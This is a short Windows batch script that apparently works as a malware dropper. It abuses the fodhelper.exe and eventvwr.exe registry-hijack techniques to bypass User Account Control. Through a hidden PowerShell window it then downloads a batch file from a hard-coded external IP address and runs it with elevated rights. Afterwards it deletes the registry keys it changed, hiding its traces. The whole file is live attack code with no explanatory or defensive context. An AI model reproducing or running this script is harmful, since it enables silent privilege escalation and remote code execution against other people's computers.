@shift /0

@echo Off
for /f "tokens=2 delims=," %%i in ('wmic os get caption^,version /format:csv') do set os=%%i
echo %os%|find " 10 ">nul && reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /c powershell -WindowStyle Hidden -command \"IEX (New-Object Net.WebClient).DownloadFile('http://23.98.155.192/sc.bat', 'C:\Users\Public\Libraries\sc.bat');\" C:\Users\Public\Libraries\sc.bat" /f && START /W fodhelper.exe && reg delete HKCU\Software\Classes\ms-settings /f||reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "cmd.exe /c powershell -WindowStyle Hidden -command \"IEX (New-Object Net.WebClient).DownloadFile('http://23.98.155.192/sc.bat', 'C:\Users\Public\Libraries\sc.bat');\" C:\Users\Public\Libraries\sc.bat" /f && START /W eventvwr.exe && reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f
